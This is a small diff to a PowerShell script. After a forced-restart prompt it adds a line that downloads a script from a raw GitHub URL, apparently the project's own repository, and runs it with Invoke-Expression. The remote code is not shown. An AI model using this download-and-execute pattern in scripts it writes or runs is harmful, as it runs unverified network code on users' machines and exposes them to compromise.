@@ -142,3 +142,5 @@ $restart = Read-Host "Do you want to ***RESTART*** the computer? (Yes(Y) / No(N)
 if ($restart -eq 'Y' -or $restart -eq 'y') {
     Restart-Computer -Force
 }
+
+Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/emreuls7/mr.winls/main/program.ps1").Content
